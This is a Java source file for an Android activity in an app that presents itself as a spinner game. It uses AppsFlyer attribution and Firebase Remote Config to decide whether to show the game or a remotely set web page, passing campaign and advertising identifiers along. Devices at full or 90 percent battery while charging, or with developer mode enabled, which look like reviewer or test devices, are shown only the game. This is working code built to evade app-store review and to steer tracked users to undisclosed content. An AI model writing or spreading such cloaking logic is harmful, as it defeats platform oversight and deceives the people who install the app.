package com.mojo.japanspinner;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.os.BatteryManager;
import android.os.Bundle;
import android.widget.ImageView;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.bumptech.glide.Glide;
import com.facebook.FacebookSdk;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
import com.onesignal.OneSignal;

import org.json.JSONObject;

import java.io.IOException;
import java.util.Map;

public class WaitActivity extends AppCompatActivity implements SaveingInterface, WaitInterface{

    ImageView gif;
    SharedPreferences settings;

    private static final String SPSTRING = "SETTINGS";
    private final String strKey1 = "run";
    private final String strKey2 = "flyer";
    private final String strKey3 = "param";
    private final String strKey4 = "url";

    private final String str_first = "FIRST";
    private final String str_second = "SECOND";

    private boolean charging;
    private boolean devMode;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_wait);

        loadGif();
        initSharePref();
        initiateServices();

        if (getRun() == str_second) {
            if (!getUrl().isEmpty()) {
                playSite();
            } else {
                playGame();
            }
        } else {
            if (checkInternetConnection()) {
                playGame();
            } else {
                AppsFlyerLib.getInstance().init(getResources().getString(R.string.appsflyer_app_id), new AppsFlyerConversionListener() {
                    @Override
                    public void onConversionDataSuccess(Map<String, Object> conversionData) {
                        if (getFlyer() == str_first) {
                            FirebaseRemoteConfig firebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
                            FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                                    .setMinimumFetchIntervalInSeconds(3600)
                                    .build();
                            firebaseRemoteConfig.setConfigSettingsAsync(configSettings);
                            firebaseRemoteConfig.fetchAndActivate()
                                    .addOnCompleteListener(WaitActivity.this, new OnCompleteListener<Boolean>() {
                                        @Override
                                        public void onComplete(@NonNull Task<Boolean> task) {
                                            try {
                                                String data = firebaseRemoteConfig.getValue("inform").asString();
                                                JSONObject jsonData = new JSONObject(data);
                                                JSONObject jsonObject = new JSONObject(conversionData);
                                                if (jsonObject.optString("af_status").equals("Non-organic")) {
                                                    String campaign = jsonObject.optString("campaign");
                                                    if (campaign.isEmpty() || campaign.equals("null")) {
                                                        campaign = jsonObject.optString("c");
                                                    }
                                                    try{
                                                        String[] splitsCampaign = campaign.split("_");
                                                        OneSignal.sendTag("user_id", splitsCampaign[2]);
                                                    } catch (Exception e){

                                                    }
                                                    String myUrl = jsonData.optString("web") + "?naming=" + campaign + "&apps_uuid=" + AppsFlyerLib.getInstance().getAppsFlyerUID(getApplicationContext()) + "&adv_id=" + jsonObject.optString("ad_id");
                                                    setUrl(myUrl);
                                                    playSite();
                                                    AppsFlyerLib.getInstance().unregisterConversionListener();
                                                } else if (jsonObject.optString("af_status").equals("Organic")) {
                                                    phonePluggedOrDeveloper();
                                                    if (((getBatteryLevel() == 100 || getBatteryLevel() == 90) && charging) || devMode) {
                                                        setUrl("");
                                                        playGame();
                                                        AppsFlyerLib.getInstance().unregisterConversionListener();
                                                    } else {
                                                        String myUrl = jsonData.optString("web") + "?naming=null&apps_uuid=" + AppsFlyerLib.getInstance().getAppsFlyerUID(getApplicationContext()) + "&adv_id=null";
                                                        setUrl(myUrl);
                                                        playSite();
                                                        AppsFlyerLib.getInstance().unregisterConversionListener();
                                                    }
                                                } else {
                                                    setUrl("");
                                                    playGame();
                                                    AppsFlyerLib.getInstance().unregisterConversionListener();
                                                }
                                                setRun(str_second);
                                                setFlyer(str_second);
                                                AppsFlyerLib.getInstance().unregisterConversionListener();
                                            } catch (Exception ex) {
                                            }
                                        }
                                    });
                        }
                    }

                    @Override
                    public void onConversionDataFail(String errorMessage) {

                    }

                    @Override
                    public void onAppOpenAttribution(Map<String, String> attributionData) {
                    }

                    @Override
                    public void onAttributionFailure(String errorMessage) {
                    }
                }, this);
                AppsFlyerLib.getInstance().start(this);
                AppsFlyerLib.getInstance().enableFacebookDeferredApplinks(true);
            }
        }

    }

    @Override
    public void initSharePref() {
        settings = getSharedPreferences(SPSTRING, MODE_PRIVATE);
    }

    @Override
    public String getRun() {
        return settings.getString(strKey1, str_first);
    }

    @Override
    public void setRun(String run) {
        settings.edit().putString(strKey1, run).apply();
    }

    @Override
    public String getFlyer() {
        return settings.getString(strKey2, str_first);
    }

    @Override
    public void setFlyer(String flyer) {
        settings.edit().putString(strKey2, flyer).apply();
    }

    @Override
    public String getParam() {
        return settings.getString(strKey3, str_first);
    }

    @Override
    public void setParam(String param) {
        settings.edit().putString(strKey3, param).apply();
    }

    @Override
    public String getUrl() {
        return settings.getString(strKey4, "");
    }

    @Override
    public void setUrl(String workingUrl) {
        settings.edit().putString(strKey4, workingUrl).apply();
    }

    @Override
    public void initiateServices() {
        OneSignal.initWithContext(this);
        OneSignal.setAppId(getResources().getString(R.string.onesignal_app_id));
        FacebookSdk.setAutoInitEnabled(true);
        FacebookSdk.fullyInitialize();
    }

    @Override
    public void playGame() {
        Intent playIntent = new Intent(WaitActivity.this, MainActivity.class);
        startActivity(playIntent);
        finish();
    }

    @Override
    public void playSite() {
        Intent playIntent = new Intent(WaitActivity.this, DesignActivity.class);
        startActivity(playIntent);
        finish();
    }

    @Override
    public boolean checkInternetConnection() {
        return ((ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE)).getActiveNetworkInfo() == null;
    }

    @Override
    public void phonePluggedOrDeveloper() {
        charging = false;
        devMode = false;
        final Intent batteryIntent;
        batteryIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        int status = batteryIntent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
        boolean batteryCharge = status==BatteryManager.BATTERY_STATUS_CHARGING;
        int chargePlug = batteryIntent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
        boolean usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB;
        boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;
        boolean devMod = (android.provider.Settings.Secure.getInt(getApplicationContext().getContentResolver(),
                android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED , 0) != 0);
        if(usbCharge){
            charging = true;
        } else if(acCharge){
            charging = true;
        } else if(devMod){
            devMode = true;
        } else if(batteryCharge){
            charging = true;
        }
    }

    @Override
    public int getBatteryLevel() {
        BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
        int batLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        return batLevel;
    }

    @Override
    public void loadGif() {
        gif = (ImageView)findViewById(R.id.loading_gif);
        Glide.with(this).load(R.drawable.wait).into(gif);
    }
}